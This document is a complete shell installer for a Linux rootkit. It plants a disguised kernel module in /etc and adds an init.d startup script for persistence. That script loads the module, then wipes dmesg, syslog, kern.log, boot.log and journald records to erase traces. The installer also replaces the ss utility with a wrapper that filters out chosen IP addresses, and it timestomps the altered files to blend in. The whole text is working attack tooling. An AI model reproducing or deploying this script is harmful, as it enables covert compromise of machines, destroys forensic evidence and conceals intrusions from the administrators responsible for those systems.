#!/bin/sh
###
###

echo -e "Installing\n"

if [ `whoami` != "root" ]; then
   echo -e "\n[E] must be root"
   exit 1
fi

echo ""
#--------------------------------------------------------------------
Pwd_Dir=$(pwd)


hide_tag="bL6qM"

src_ko=klogd.ko
# xxx, "/etc/"
dst_ko=/etc/$hide_tag

start_path=/etc/init.d/$hide_tag



cat > $Pwd_Dir/tmp1 <<EOF
#!/bin/sh
#
case "\$1" in
'start')
	/sbin/insmod ${dst_ko}
	dmesg -C
	sed -i '/bL6/d' /var/log/boot.log || true
	sed -i '/klogd/d' /var/log/kern.log || true
	sed -i '/klogd/d' /var/log/syslog || true
	journalctl --vacuum-time=1s 2>/dev/null || true 
	journalctl -k --vacuum-time=1s 2>/dev/null || true 
	journalctl --rotate --vacuum-time=1s --quiet 2>/dev/null || true
	;;
'stop')

	;;
esac

exit 0

EOF

FILTER_IPS="$1"


cat > $Pwd_Dir/tmp2 <<EOF
#!/bin/bash

exec /usr/bin/clears "\$@" | grep -Ev "$FILTER_IPS"

exit 0

EOF


_install1 () {

	cp $Pwd_Dir/tmp1 $start_path

	chmod +x $start_path
	
	cp $Pwd_Dir/$src_ko $dst_ko
	
	ln -sf $start_path /etc/rc3.d/S55$hide_tag
	cp -a /usr/bin/ss /usr/bin/clears
	cp -a $Pwd_Dir/tmp2 /usr/bin/ss
	chmod 755 /usr/bin/ss
	touch -r /usr/bin/clears /usr/bin/ss
	touch -r /usr/bin/clear /usr/bin/clears 
	
	if [ -x /etc/init.d/$hide_tag ]; then
		/etc/init.d/$hide_tag start
		
		echo " >> ko path: "$dst_ko
		echo " >> start path: "${start_path}""
		
		echo -e "    --- ok ---    \n"
	fi

	exit 0;
}

if [ -x /etc/init.d/ ]; then
   _install1
fi
   

exit 0   